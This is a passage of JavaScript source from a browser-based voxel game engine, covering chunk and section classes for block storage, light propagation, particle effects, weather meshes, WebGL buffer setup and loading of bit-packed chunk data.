							barray[index+47] = normal[0]
							barray[index+48] = normal[1]
							barray[index+49] = normal[2]
							barray[index+50] = shadows[3]
							barray[index+51] = slights[3]
							barray[index+52] = blights[3]
              barray[index+53] = tints[9]
              barray[index+54] = tints[10]
              barray[index+55] = tints[11]
							index += 56
						}
					}
					texNum++
				}
				if(!(i%256)) await yieldThread()
			}
			return index
		}
		tick() {
			if(!performFast) for (let i = 0; i < 16; i++) {
				let rnd = rand(this.blocks.length) | 0
				let x = (rnd >> 8) + this.x
				let y = (rnd >> 4 & 15) + this.y
				let z = (rnd & 15) + this.z
				let block = this.blocks[rnd] || 0
				let f = blockData[block].fallingDust
				let d = blockData[block].dripThroughBlocks
				let dr = blockData[block].drip
				let under = world.getBlock(x,y-1,z,this.type)
				let under2 = world.getBlock(x,y-2,z,this.type)
				if(f && !(under && blockData[under].solid)){
					world.addParticle(new entities[entityIds.FallingDustParticle](x+rand(-0.5,0.5),y-0.5,z+rand(-0.5,0.5),f),this.type)
				}
				if(f && under && blockData[under].leaves && !(under2 && blockData[under2].solid)){
					world.addParticle(new entities[entityIds.FallingDustParticle](x+rand(-0.5,0.5),y-1.5,z+rand(-0.5,0.5),f),this.type)
				}
				if(d && under && blockData[under].solid && !(under2 && (blockData[under2].solid || blockData[under2].liquid))){
					world.addParticle(new entities[entityIds.DripParticle](x+rand(-0.5,0.5),y-1.51,z+rand(-0.5,0.5),d, blockData[block].name === "Water"),this.type)
				}
				if(blockData[block].clientTick){
					blockData[block].clientTick(block,x,y,z,this.type,this.world)
				}
				if(dr){
					if(!(under && blockData[under].solid)) world.addParticle(new entities[entityIds.DripParticle](x+rand(-0.5,0.5),y-0.51,z+rand(-0.5,0.5),dr),this.type)
					let s = world.getBlock(x,y+1,z,this.type)
					if(!(s && blockData[s].solid)) world.addParticle(new entities[entityIds.DripParticle](x+rand(-0.5,0.5),y+0.51,z+rand(-0.5,0.5),dr),this.type)
					s = world.getBlock(x,y,z+1,this.type)
					if(!(s && blockData[s].solid)) world.addParticle(new entities[entityIds.DripParticle](x+rand(-0.5,0.5),y+rand(-0.5,0.5),z+0.51,dr),this.type)
					s = world.getBlock(x,y,z-1,this.type)
					if(!(s && blockData[s].solid)) world.addParticle(new entities[entityIds.DripParticle](x+rand(-0.5,0.5),y+rand(-0.5,0.5),z-0.51,dr),this.type)
					s = world.getBlock(x+1,y,z,this.type)
					if(!(s && blockData[s].solid)) world.addParticle(new entities[entityIds.DripParticle](x+0.51,y+rand(-0.5,0.5),z+rand(-0.5,0.5),dr),this.type)
					s = world.getBlock(x-1,y,z,this.type)
					if(!(s && blockData[s].solid)) world.addParticle(new entities[entityIds.DripParticle](x-0.51,y+rand(-0.5,0.5),z+rand(-0.5,0.5),dr),this.type)
				}
				if(blockData[block].name === "pointedDripstone" && !(under && blockData[under].solid)){
					let above = world.getBlock(x,y+2,z,this.type)
					world.addParticle(new entities[entityIds.DripParticle](x,y-0.51,z,blockData[above].dripThroughBlocks||blockData[blockIds.Water].dripThroughBlocks, blockData[above].name === "Water"),this.type)
				}
			}
		}

		/** block: 1:block light, 2:sky light, 3:spread from sky light, 4:spread from block light */
		getLight(x, y, z, block = 0) {
			let i = x * 256 + y * 16 + z
			let arr = (block&1) ? this.blockLight : this.skyLight
			return (arr[i] & 15 << ((block&2)<<1)) >> ((block&2)<<1)
		}
		setLight(x, y, z, level, block = 0) {
			let i = x * 256 + y * 16 + z
			let arr = (block&1) ? this.blockLight : this.skyLight
			arr[i] = level << ((block&2)<<1) | arr[i] & ~(15 << ((block&2)<<1))
		}
    getTags(x, y, z){
			return this.tags[x * 256 + y * 16 + z]
    }
    getTagByName(x, y, z, n){
      var t = this.getTags(x,y,z)
			let tagBits = blockData[this.getBlock(x,y,z)].tagBits
			if(tagBits){
				if(!tagBits[n]) return 0
				return (t >>> tagBits[n][0]) & ((1 << tagBits[n][1])-1)
				//((1 << tagBits[n][1])-1) does this: 2 -> 11,  3 -> 111
			}else return t && t[n]
    }
    setTags(x,y,z, data){
			this.tags[x * 256 + y * 16 + z] = data
    }
    setTagByName(x, y, z, n, data){
      let i = x * 256 + y * 16 + z
			let t = this.tags[i]
			let tagBits = blockData[this.getBlock(x,y,z)].tagBits
      if(!t){
        if(tagBits) t = this.tags[i] = 0
				else t = this.tags[i] = {}
      }
      if(tagBits){
				if(!tagBits[n]) throw new Error("Cannot set "+n+" on binary tags.")
				let countMask = (1 << tagBits[n][1])-1
				if(data > countMask) throw new Error("Tag too large")
				let mask = countMask << tagBits[n][0]
				t = (t & (~mask)) | (data << tagBits[n][0])
				//what this complicated thing does is: set certain bits
				if(t) this.tags[i] = t
				else delete this.tags[i]
			}else t[n] = data
      return t
    }
	}
	let emptySection = new Section(0, 0, 0)
	let fullSection = new Section(0, 0, 0)
	emptySection.skyLight.fill(255)

	function getTagBits(t,n,block){
		let tagBits = blockData[block].tagBits
		return (t >>> tagBits[n][0]) & ((1 << tagBits[n][1])-1)
	}
	function getTag(t,n,block){
		let tagBits = block.tagBits
		if(tagBits){
			return (t >> tagBits[n][0]) & ((1 << tagBits[n][1])-1)
		}else return t && t[n]
	}

	let tempColumnArr = new Uint8Array(16 * 16) //Temporary array
	class Chunk {
		constructor(x, z, type, world) {
			this.x = x
			this.z = z
			this.maxY = 0
			this.minY = 255
			this.sections = []
			this.tops = tempColumnArr // Store the heighest block at every (x,z) coordinate
      this.solidTops = tempColumnArr
      this.biomes = tempColumnArr // biome id at every (x,z) coordinate
			this.caveY = tempColumnArr //Bottom and top of the highest cave
			this.caveBiomes = tempColumnArr
			this.optimized = false
			this.lit = false
			this.wasLit = false
			this.lazy = false
			this.loaded = false
      this.type = type || ""
			// vao for this chunk
			this.vao = glExtensions.vertex_array_object.createVertexArrayOES()
      this.doubleRender = false
      this.world = world
			this.prevWeather = ""
			this.weatherVAO = glExtensions.vertex_array_object.createVertexArrayOES()
			this.updateWeather = false
			this.entities = {}
			this.columnHashs = new Uint8Array(16 * 16)//used to detect when column changes
		}
		getBlock(x, y, z) {
			y -= minHeight
			let s = y >> 4
			return s < this.sections.length && s >= 0 ? this.sections[s].getBlock(x, y & 15, z) : 0
		}
		setBlock(x, y, z, blockID, user) {
			let py = y
			y -= minHeight
      if(y<0) return
			if (!this.sections[y >> 4]) {
				do {
          let section = new Section(this.x, this.sections.length * 16 + minHeight, this.z, this)
          if(this.lit) section.skyLight.fill(15)
					this.sections.push(section)
				} while (!this.sections[y >> 4])
			}
      if (blockData[blockID].semiTrans) {
        this.doubleRender = true
        if (!this.world.doubleRenderChunks.includes(this)) {
          this.world.doubleRenderChunks.push(this)
        }
      }
			this.sections[y >> 4].setBlock(x, y & 15, z, blockID)
			this.updateSolidTop(x,py,z,blockID)
			this.columnHashs[z*16+x]++
		}
		updateSolidTop(x,y,z,blockID){
			if(blockID && (blockData[blockID].solid || blockData[blockID].liquid)){
				this.solidTops[z*16+x] = max(this.solidTops[z*16+x],y)
			}else if(y >= this.solidTops[z*16+x]){
				let top = this.solidTops[z*16+x]
				while(true) {
					let block = this.getBlock(x,top,z)
					if(blockData[block].solid || blockData[block].liquid || top<minHeight) break
					top--
				}
				this.solidTops[z*16+x] = top
			}
			this.updateWeather = true
			/*let half = skybox.weatherSize/2, px = round(p.renderX), pz = round(p.renderZ)
			x += this.x, z += this.z
			if(x > px-half && x < px+half && z > pz-half && z < pz+half) skybox.prevWeatherPos = ","*/
		}
		deleteBlock(x, y, z, user) {
			let py = y
			y -= minHeight
			if (!this.sections[y >> 4]) {
				return
			}
			this.sections[y >> 4].deleteBlock(x, y & 15, z)
			this.minY = py < this.minY ? py : this.minY
			this.maxY = py > this.maxY ? py : this.maxY
			this.updateSolidTop(x,py,z,0)
			this.columnHashs[z*16+x]++
		}
    getTags(x, y, z){
			y -= minHeight
      let s = y >> 4
			return s < this.sections.length && s >= 0 ? this.sections[s].getTags(x, y & 15, z) : undefined
    }
    getTagByName(x,y,z,n){
			y -= minHeight
      let s = y >> 4
			return s < this.sections.length && s >= 0 ? this.sections[s].getTagByName(x, y & 15, z,n) : undefined
    }
    setTags(x,y,z,data){
			y -= minHeight
      let s = y >> 4
			if(s < this.sections.length && s >= 0) this.sections[s].setTags(x, y & 15, z, data)
    }
    setTagByName(x,y,z,n,data){
			y -= minHeight
			if (!this.sections[y >> 4]) {
				do {
          let section = new Section(this.x, this.sections.length * 16 + minHeight, this.z, this)
          if(this.lit) section.skyLight.fill(15)
					this.sections.push(section)
				} while (!this.sections[y >> 4])
			}
			return this.sections[y>>4].setTagByName(x, y & 15, z,n,data)
    }
		setLight(x, y, z, level, blockLight) {
			y -= minHeight
			if (!this.sections[y >> 4]) {
				do {
          let section = new Section(this.x, this.sections.length * 16 + minHeight, this.z, this)
          if(this.lit) section.skyLight.fill(15)
					this.sections.push(section)
				} while (!this.sections[y >> 4])
			}
			this.sections[y >> 4].setLight(x, y & 15, z, level, blockLight)
		}
		getLight(x, y, z, blockLight = 0) {
			y -= minHeight
			if (!this.sections[y >> 4]) return !(blockLight&1) * 15
			return this.sections[y >> 4].getLight(x, y & 15, z, blockLight)
		}
		fillLight() {
			if(!this.world.isMK){
				this.lit = true
				return
			}
			
			if(host){
				let otherChunk = serverWorld[this.type].getChunk(this.x,this.z)
				if(otherChunk && otherChunk.lit){
					this.loadCopyLight()
					let n = this.world.getChunk(this.x+16,this.z,this.type)
					if(n && n.loaded) n.loadCopyLight()
					n = this.world.getChunk(this.x-16,this.z,this.type)
					if(n && n.loaded) n.loadCopyLight()
					n = this.world.getChunk(this.x,this.z+16,this.type)
					if(n && n.loaded) n.loadCopyLight()
					n = this.world.getChunk(this.x,this.z-16,this.type)
					if(n && n.loaded) n.loadCopyLight()
					n = this.world.getChunk(this.x+16,this.z+16,this.type)
					if(n && n.loaded) n.loadCopyLight()
					n = this.world.getChunk(this.x-16,this.z+16,this.type)
					if(n && n.loaded) n.loadCopyLight()
					n = this.world.getChunk(this.x+16,this.z-16,this.type)
					if(n && n.loaded) n.loadCopyLight()
					n = this.world.getChunk(this.x-16,this.z-16,this.type)
					if(n && n.loaded) n.loadCopyLight()
					this.lit = true
					this.wasLit = true
				}
				return
			}
			
			let max = this.sections.length * 16 - 1 + minHeight
			let blockSpread = []

			if(this.wasLit) this.unfillLight()
	
			// Set virtical columns of light to level 15
			for (let x = 0; x < 16; x++) {
				for (let z = 0; z < 16; z++) {
					let light = 15, stop = false
					for (let y = max; y >= minHeight; y--) {
						let data = blockData[this.getBlock(x, y, z)]
						if (data.lightLevel) {
							if (!blockSpread[data.lightLevel]) blockSpread[data.lightLevel] = []
							blockSpread[data.lightLevel].push(x + this.x, y, z + this.z)
							this.setLight(x, y, z, data.lightLevel, 1)
							this.setLight(x, y, z, data.lightLevel, 3)
						}
						if (!stop && !data.transparent) {
							this.tops[z * 16 + x] = y
							light = 0
							stop = true
						} else if (light) {
							if(data.decreaseLight) light = Math.max(light-data.decreaseLight,0)
							this.setLight(x, y, z, light, 2)
							this.setLight(x, y, z, light, 0)
						}
					}
				}
			}
	
			// Spread the light to places where the virtical columns stopped earlier, plus chunk borders
			let spread = []
			for (let x = 0; x < 16; x++) {
				for (let z = 0; z < 16; z++) {
					for (let y = this.tops[z * 16 + x] + 1; y <= max; y++) {
						let light = this.getLight(x, y+1, z, 0)
						if(!spread[light]) spread[light] = []
						if (this.getLight(x+1,y,z,0) < light) {
							spread[light].push(x + this.x, y, z + this.z)
							continue
						}
						if (this.getLight(x-1,y,z,0) < light) {
							spread[light].push(x + this.x, y, z + this.z)
							continue
						}
						if (this.getLight(x,y,z+1,0) < light) {
							spread[light].push(x + this.x, y, z + this.z)
							continue
						}
						if (this.getLight(x,y,z-z,0) < light) {
							spread[light].push(x + this.x, y, z + this.z)
							continue
						}
						break
					}
				}
			}
			
			for(let i = spread.length - 1; i > 0; i--){
				if(spread[i]) this.spreadLight(spread[i], i - 1)
			}
	
			for (let i = blockSpread.length - 1; i > 0; i--) {
				let blocks = blockSpread[i]
				if (blocks && blocks.length) {
					this.spreadLight(blocks, i - 1, false, 1)
				}
			}
	
			this.lit = true
			this.wasLit = true
		}
		unfillLight(){
			if(!this.world.isMK){
				this.lit = false
				return
			}
			
			let max = this.sections.length * 16 - 1 + minHeight
			let spread = [], blspread = []
			for (let x = 0; x < 16; x++) {
				for (let z = 0; z < 16; z++) {
					for (let y = max; y >= minHeight; y--) {
						let sl = this.getLight(x,y,z,2)
						let bl = this.getLight(x,y,z,3)
						if(sl){
							this.setLight(x,y,z,0,2)
							this.setLight(x,y,z,0,0)
							;(spread[sl] || (spread[sl] = [])).push(x,y,z)
						}
						if(bl){
							this.setLight(x,y,z,0,3)
							this.setLight(x,y,z,0,1)
							;(blspread[bl] || (blspread[bl] = [])).push(x,y,z)
						}
					}
				}
			}
			for(let i = spread.length - 1; i > 0; i--){
				let respread = []
				for (let i = 0; i <= 15/*blockLight + 1*/; i++) respread[i] = []
				if(spread[i]){
					this.unSpreadLight(spread[i], i - 1, respread, 0)
					this.reSpreadLight(respread, 0)
				}
			}
			for(let i = blspread.length - 1; i > 0; i--){
				let respread = []
				for (let i = 0; i <= 15/*blockLight + 1*/; i++) respread[i] = []
				if(blspread[i]){
					this.unSpreadLight(blspread[i], i - 1, respread, 1)
					this.reSpreadLight(respread, 1)
				}
			}
			this.lit = false
			this.wasLit = false
		}
		trySpread(x, y, z, level, spread, blockLight, update = false) {
      if(y < minHeight) return
      
			if (this.world.getLight(x, y, z, blockLight, this.type) < level) {
				let chunk = this.world.getChunk(x,z,this.type)
				if (blockData[this.world.getBlock(x, y, z, this.type)].transparent) {
					this.world.setLight(x, y, z, level, blockLight, this.type)
					spread.push(x, y, z)
				}
			}
			if (update && (x < this.x || x > this.x + 15 || z < this.z || z > this.z + 15)) {
				let chunk = this.world.getChunk(x, z, this.type)
				if (chunk.buffer && !this.world.meshQueue.includes(chunk)) {
					this.world.meshQueue.push(chunk)
				}
			}
		}
		spreadLight(blocks, level, update = false, blockLight = 0) {
			let spread = []
			let x = 0, y = 0, z = 0
			for (let i = 0; i < blocks.length; i += 3) {
				x = blocks[i]
				y = blocks[i+1]
				z = blocks[i+2]
        if(y < minHeight) continue
				this.trySpread(x - 1, y, z, level, spread, blockLight, update)
				this.trySpread(x + 1, y, z, level, spread, blockLight, update)
				this.trySpread(x, y - 1, z, level, spread, blockLight, update)
				this.trySpread(x, y + 1, z, level, spread, blockLight, update)
				this.trySpread(x, y, z - 1, level, spread, blockLight, update)
				this.trySpread(x, y, z + 1, level, spread, blockLight, update)
			}
			if (level > 1 && spread.length) {
				this.spreadLight(spread, level - 1, update, blockLight)
			}
		}
		tryUnSpread(x, y, z, level, spread, respread, blockLight) {
      if(y < minHeight) return
      
			let light = this.world.getLight(x, y, z, blockLight, this.type)
			let spreadSource = this.world.getLight(x, y, z, blockLight|2, this.type) //won't be 0 if light source here
			let trans = blockData[this.world.getBlock(x, y, z, this.type)].transparent
			if (light === level) {
				if (trans) {
					this.world.setLight(x, y, z, spreadSource, blockLight, this.type)
					spread.push(x, y, z)
				}
				if(spreadSource) respread[spreadSource].push(x, y, z)
			} else if (light > level) {
				respread[light].push(x, y, z)
			}
			if (x < this.x || x > this.x + 15 || z < this.z || z > this.z + 15) {
				let chunk = this.world.getChunk(x, z, this.type)
				if (chunk && chunk.buffer && !this.world.meshQueue.includes(chunk)) {
					this.world.meshQueue.push(chunk)
				}
			}
		}
		unSpreadLight(blocks, level, respread, blockLight) {
			let spread = []
			let x = 0, y = 0, z = 0
			for (let i = 0; i < blocks.length; i += 3) {
				x = blocks[i]
				y = blocks[i+1]
				z = blocks[i+2]
        if(y < minHeight) continue
				this.tryUnSpread(x - 1, y, z, level, spread, respread, blockLight)
				this.tryUnSpread(x + 1, y, z, level, spread, respread, blockLight)
				this.tryUnSpread(x, y - 1, z, level, spread, respread, blockLight)
				this.tryUnSpread(x, y + 1, z, level, spread, respread, blockLight)
				this.tryUnSpread(x, y, z - 1, level, spread, respread, blockLight)
				this.tryUnSpread(x, y, z + 1, level, spread, respread, blockLight)
			}
			if (level > 1 && spread.length) {
				this.unSpreadLight(spread, level - 1, respread, blockLight)
			}
		}
		reSpreadLight(respread, blockLight) {
			for (let i = respread.length - 1; i > 1; i--) {
				let blocks = respread[i]
				let level = i - 1
				let spread = respread[level]
				for (let j = 0; j < blocks.length; j += 3) {
					let x = blocks[j]
					let y = blocks[j+1]
					let z = blocks[j+2]
					this.trySpread(x - 1, y, z, level, spread, blockLight)
					this.trySpread(x + 1, y, z, level, spread, blockLight)
					this.trySpread(x, y - 1, z, level, spread, blockLight)
					this.trySpread(x, y + 1, z, level, spread, blockLight)
					this.trySpread(x, y, z - 1, level, spread, blockLight)
					this.trySpread(x, y, z + 1, level, spread, blockLight)
				}
			}
		}
		async optimize() {
			for (let i = 0; i < this.sections.length; i++) {
				this.sections[i].optimize()
				await yieldThread()
			}
			/*if (!this.world.meshQueue.includes(this)) {
				this.world.meshQueue.push(this)
			}*/
			this.optimized = true
		}
		/*reoptimizeXPos(){
			let x = 15
			for (let i = 0; i < this.sections.length; i++){
				for(let y=0;y<16;y++) for(let z=0;z<16;z++){
					if(this.sections[i].getBlock(x,y,z)) this.sections[i].updateBlock(x, y, z, true, x,y,z)
				}
			}
		}
		reoptimizeXNeg(){
			let x = 0
			for (let i = 0; i < this.sections.length; i++){
				for(let y=0;y<16;y++) for(let z=0;z<16;z++){
					if(this.sections[i].getBlock(x,y,z)) this.sections[i].updateBlock(x, y, z, true, x,y,z)
				}
			}
		}
		reoptimizeZPos(){
			let z = 15
			for (let i = 0; i < this.sections.length; i++){
				for(let y=0;y<16;y++) for(let x=0;x<16;x++){
					if(this.sections[i].getBlock(x,y,z)) this.sections[i].updateBlock(x, y, z, true, x,y,z)
				}
			}
		}
		reoptimizeZNeg(){
			let z = 0
			for (let i = 0; i < this.sections.length; i++){
				for(let y=0;y<16;y++) for(let x=0;x<16;x++){
					if(this.sections[i].getBlock(x,y,z)) this.sections[i].updateBlock(x, y, z, true, x,y,z)
				}
			}
		}*/
		render() {
			if (!this.buffer) {
				return
			}
			if (p.camera.canSee(this.x, this.minY, this.z, this.maxY)) {
				renderedChunks++
				glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
				gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
				glExtensions.vertex_array_object.bindVertexArrayOES(null)
			}
		}
		renderWeather(){
			if (!this.weatherBuffer || chunkDist(this) > weatherRenderDist) {
				return
			}
			if (p.camera.canSee(this.x, 0, this.z, weatherHeight)) {
				glExtensions.vertex_array_object.bindVertexArrayOES(this.weatherVAO)
				gl.drawElements(gl.TRIANGLES, 6 * this.weatherSize, gl.UNSIGNED_INT, 0)
				glExtensions.vertex_array_object.bindVertexArrayOES(null)
			}
		}
		updateBlock(x, y, z, lazy, noOnupdate, sx,sy,sz) {
			y -= minHeight
			if (this.buffer) {
				this.lazy = lazy
				if ((this.sections.length > y >> 4) && this.sections[y >> 4]) {
					this.sections[y >> 4].updateBlock(x, y & 15, z, noOnupdate, sx,sy,sz)
				}
			}
		}
		async genMesh() {
			let start = performance.now()
			let barray = bigArray
			let index = 0
			if (!this.buffer) {
				this.buffer = gl.createBuffer() // this should exist after sync call to genMesg
			}
			for (let i = 0; i < this.sections.length; i++) {
				index = await this.sections[i].genMesh(barray, index)
			}
			let arrayDone = performance.now()

			let data = barray.slice(0, index)

			let maxY = minHeight
			let minY = maxHeight
			let y = 0
			for (let i = 1; i < data.length; i += 6) {
				y = data[i]
				maxY = max(maxY, y)
				minY = min(minY, y)
			}
			this.maxY = maxY
			this.minY = minY
			this.faces = data.length / 56
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)
			gl.bindBuffer(gl.ARRAY_BUFFER, this.buffer)
			gl.bufferData(gl.ARRAY_BUFFER, data, gl.DYNAMIC_DRAW)
			gl.enableVertexAttribArray(glCache.aVertex)
			gl.enableVertexAttribArray(glCache.aTexture)
      gl.enableVertexAttribArray(glCache.aNormal)
			gl.enableVertexAttribArray(glCache.aShadow)
			gl.enableVertexAttribArray(glCache.aSkylight)
			gl.enableVertexAttribArray(glCache.aBlocklight)
      gl.enableVertexAttribArray(glCache.tint)
			gl.vertexAttribPointer(glCache.aVertex, 3, gl.FLOAT, false, 56, 0)
			gl.vertexAttribPointer(glCache.aTexture, 2, gl.FLOAT, false, 56, 12)
			gl.vertexAttribPointer(glCache.aNormal, 3, gl.FLOAT, false, 56, 20)
			gl.vertexAttribPointer(glCache.aShadow, 1, gl.FLOAT, false, 56, 32)
			gl.vertexAttribPointer(glCache.aSkylight, 1, gl.FLOAT, false, 56, 36)
			gl.vertexAttribPointer(glCache.aBlocklight, 1, gl.FLOAT, false, 56, 40)
      gl.vertexAttribPointer(glCache.tint, 3, gl.FLOAT, false, 56, 44)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
			this.lazy = false
		}
		genWeather(){
			let th = 1/4*skybox.stretchHeight, tw = 1/2 //tw has multiple types
			let size = 0
			let texNum = 0
			let shapeVerts = []
			let index = 0
			for(let lx=0; lx<16; lx++) for(let lz=0; lz<16; lz++){
				let x = lx+this.x, z = lz+this.z
				let top = this.solidTops[lz*16+lx]+0.5//world.getSolidTop(x,z,p.dimension)+0.5
				if(top > weatherHeight) continue
				let type = (weather || prevActualWeather) === "snow" || getBiomeTemperature(biomes[this.biomes[lz*16+lx]]) <= 0.15 ? 1 : 0
				let tx = type === 1 ? 0.5 : 0, ty = hash(x,z)
				let h = (weatherHeight-top)*th
				shapeVerts[index] = x+0.5
				shapeVerts[index+1] = weatherHeight
				shapeVerts[index+2] = z+0.5
				shapeVerts[index+3] = tx+tw
				shapeVerts[index+4] = ty
				shapeVerts[index+5] = type

				shapeVerts[index+6] = x-0.5
				shapeVerts[index+7] = weatherHeight
				shapeVerts[index+8] = z-0.5
				shapeVerts[index+9] = tx
				shapeVerts[index+10] = ty
				shapeVerts[index+11] = type

				shapeVerts[index+12] = x-0.5
				shapeVerts[index+13] = top
				shapeVerts[index+14] = z-0.5
				shapeVerts[index+15] = tx
				shapeVerts[index+16] = ty+h
				shapeVerts[index+17] = type

				shapeVerts[index+18] = x+0.5
				shapeVerts[index+19] = top
				shapeVerts[index+20] = z+0.5
				shapeVerts[index+21] = tx+tw
				shapeVerts[index+22] = ty+h
				shapeVerts[index+23] = type
				index += 24

				shapeVerts[index] = x+0.5
				shapeVerts[index+1] = weatherHeight
				shapeVerts[index+2] = z-0.5
				shapeVerts[index+3] = tx+tw
				shapeVerts[index+4] = ty
				shapeVerts[index+5] = type

				shapeVerts[index+6] = x-0.5
				shapeVerts[index+7] = weatherHeight
				shapeVerts[index+8] = z+0.5
				shapeVerts[index+9] = tx
				shapeVerts[index+10] = ty
				shapeVerts[index+11] = type

				shapeVerts[index+12] = x-0.5
				shapeVerts[index+13] = top
				shapeVerts[index+14] = z+0.5
				shapeVerts[index+15] = tx
				shapeVerts[index+16] = ty+h
				shapeVerts[index+17] = type

				shapeVerts[index+18] = x+0.5
				shapeVerts[index+19] = top
				shapeVerts[index+20] = z-0.5
				shapeVerts[index+21] = tx+tw
				shapeVerts[index+22] = ty+h
				shapeVerts[index+23] = type
				index += 24
				size += 2
			}
			const buffer = this.weatherBuffer || (this.weatherBuffer = gl.createBuffer()), vao = this.weatherVAO
			glExtensions.vertex_array_object.bindVertexArrayOES(vao)
			gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

			gl.bindBuffer(gl.ARRAY_BUFFER, buffer)
			gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts), gl.STATIC_DRAW)
			gl.vertexAttribPointer(glCache.aVertexWeather, 3, gl.FLOAT, false, 24, 0)
			gl.vertexAttribPointer(glCache.aTextureWeather, 2, gl.FLOAT, false, 24, 12)
			gl.vertexAttribPointer(glCache.typeWeather, 1, gl.FLOAT, false, 24, 20)

			gl.enableVertexAttribArray(glCache.aVertexWeather)
			gl.enableVertexAttribArray(glCache.aTextureWeather)
			gl.enableVertexAttribArray(glCache.typeWeather)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
			this.updateWeather = false
			this.weatherSize = size
			this.prevWeather = (weather || prevActualWeather)
		}
		tick() {
			if(((weather || prevActualWeather) !== this.prevWeather || weather && this.updateWeather) && chunkDist(this) <= weatherRenderDist){
				if (!world.weatherMeshQueue.includes(this)) {
					world.weatherMeshQueue.push(this)
				}
			}
			let simDist = settings.simulationDistance*16
			if(max(abs(this.x+8 - p.x), abs(this.z+8 - p.z)) < simDist){
				for (let i = 0; i < this.sections.length; i++) {
					if(abs(this.sections[i].y - p.y) < simDist) this.sections[i].tick()
				}
			}
			for (let i in this.entities) {
				const entity = this.entities[i]
				entity.update()
				if (entity.canDespawn || (entity.y <= minEntityY)) {
					world.deleteEntity(i)
				}
			}
			rain: if(weather === "rain" && !performFast && (weatherAmount===1 || rand()<weatherAmount)){
				let x = floor(rand(16)), z = floor(rand(16))
				let y = this.solidTops[z * 16 + x]
				if(dist3(this.x+x,y,this.z+z,p.x,p.y,p.z) > weatherRenderDist) break rain
				if(y < minHeight || y > weatherHeight) break rain
				let block = this.getBlock(x,y,z)
				if(blockData[block].leaves){
					let under = this.getBlock(x,y-1,z)
					if(blockData[under].transparent && rand()>0.5){
						world.addParticle(new entities[entityIds.DripParticle](this.x+x+rand(-0.5,0.5),y-0.51,this.z+z+rand(-0.5,0.5),blockData[blockIds.Water].dripThroughBlocks, true),this.type)
						break rain
					}
				}
				this.world.addParticle(new entities[entityIds.SplashParticle](x+this.x,y+0.75,z+this.z),this.type)
			}
		}
		load(data) {
			if(this.loaded) return
			let reader = new BitArrayReader(data.data)
			let paletteLen = reader.read(32)
			let palette = []
			let paletteBits = BitArrayBuilder.bits(paletteLen)
			for (let i = 0; i < paletteLen; i++){
				let block = reader.read(32)
				palette.push(block)
				if(blockData[block].semiTrans) this.doubleRender = true
			}

			const getIndex = [
				(index, x, y, z) => (y + (index >> 6 & 7))*16 + (x + (index >> 3 & 7))*256 + z + (index >> 0 & 7),
				(index, x, y, z) => (y + (index >> 6 & 7))*16 + (x + (index >> 0 & 7))*256 + z + (index >> 3 & 7),
				(index, x, y, z) => (y + (index >> 3 & 7))*16 + (x + (index >> 6 & 7))*256 + z + (index >> 0 & 7),
				(index, x, y, z) => (y + (index >> 0 & 7))*16 + (x + (index >> 6 & 7))*256 + z + (index >> 3 & 7),
				(index, x, y, z) => (y + (index >> 0 & 7))*16 + (x + (index >> 3 & 7))*256 + z + (index >> 6 & 7),
				(index, x, y, z) => (y + (index >> 3 & 7))*16 + (x + (index >> 0 & 7))*256 + z + (index >> 6 & 7)
			]

			let sectionCount = reader.read(32)
			let maxSectionY = minHeight/16
			let importants = []
			for (let i = 0; i < sectionCount; i++) {
				let x = reader.read(1) * 8
				let y = reader.read(8) * 8
				let z = reader.read(1) * 8
				let orientation = reader.read(3)
				let sy = y>>4
				y = y&15

				let section = this.sections[sy]
				if(!section) section = this.sections[sy] = new Section(this.x, sy*16+minHeight, this.z, this)
				maxSectionY = max(maxSectionY,sy)
				let blocks = section.blocks, tagss = section.tags//, slights = section.skyLight, blights = section.blockLight

				let runs = reader.read(8)
				let singles = reader.read(9)
				for (let j = 0; j < runs; j++) {
					let index = reader.read(9)
					let types = reader.read(9)
					let lenSize = reader.read(4)
					for (let k = 0; k < types; k++) {
						let chain = reader.read(lenSize) + 1
						let block = reader.read(paletteBits)
						for (let l = 0; l < chain; l++) {
							let idx = getIndex[orientation](index, x, y, z)
							blocks[idx] = palette[block]
							if(blockData[palette[block]].importantOnset){
								importants.push(idx,palette[block])
							}
							index++
						}
					}
				}
				for (let j = 0; j < singles; j++) {
					let index = reader.read(9)
					let block = reader.read(paletteBits)
					let idx = getIndex[orientation](index, x, y, z)
					blocks[idx] = palette[block]
					if(blockData[palette[block]].importantOnset){
						importants.push(idx,palette[block])
					}
				}
				let tagsCount = reader.read(9)
				for(let j=0; j<tagsCount; j++){
					let index = reader.read(9)
					if(reader.read(1)){
						let tags = reader.readString(16)
						try{
							tagss[getIndex[0](index, x, y, z)] = JSON.parse(tags)
						}catch(e){console.log(e)}
					}else{
						tagss[getIndex[0](index, x, y, z)] = reader.read(32)
					}
				}
				/*let slightRuns = reader.read(9)
				for (let j = 0; j < slightRuns; j++) {
					let index = reader.read(9)
					let types = reader.read(9)
					let lenSize = reader.read(4)
					for (let k = 0; k < types; k++) {
						let chain = reader.read(lenSize) + 1
						let level = reader.read(8)
						let gradDir = reader.read(9,true)
						for (let l = 0; l < chain; l++) {
							let idx = getIndex[orientation](index, x, y, z)
							slights[idx] = level+l*gradDir
							index++
						}
					}
				}
				let blightRuns = reader.read(9)
				for (let j = 0; j < blightRuns; j++) {
					let index = reader.read(9)
					let types = reader.read(9)
					let lenSize = reader.read(4)
					for (let k = 0; k < types; k++) {
						let chain = reader.read(lenSize) + 1
						let level = reader.read(4)
						let gradDir = reader.read(5,true)
						for (let l = 0; l < chain; l++) {
							let idx = getIndex[orientation](index, x, y, z)
							blights[idx] = level+l*gradDir
							index++
						}
					}
				}*/

				for(let i=0; i<importants.length; i+=2){
					let idx = importants[i]
					blockData[importants[i+1]].importantOnset(this.x+((idx>>8)&15),(sy*16)+minHeight+((idx>>4)&15),this.z+(idx&15), this.type,this.world)
				}
				importants.length = 0
			}
			for(let y = 0; y < maxSectionY; y++){
				if(!this.sections[y]) this.sections[y] = new Section(this.x, y*16+minHeight, this.z, this)
			}
			if(this.doubleRender){
				if (!this.world.doubleRenderChunks.includes(this)) {
          this.world.doubleRenderChunks.push(this)
        }
			}
			this.tops = data.tops
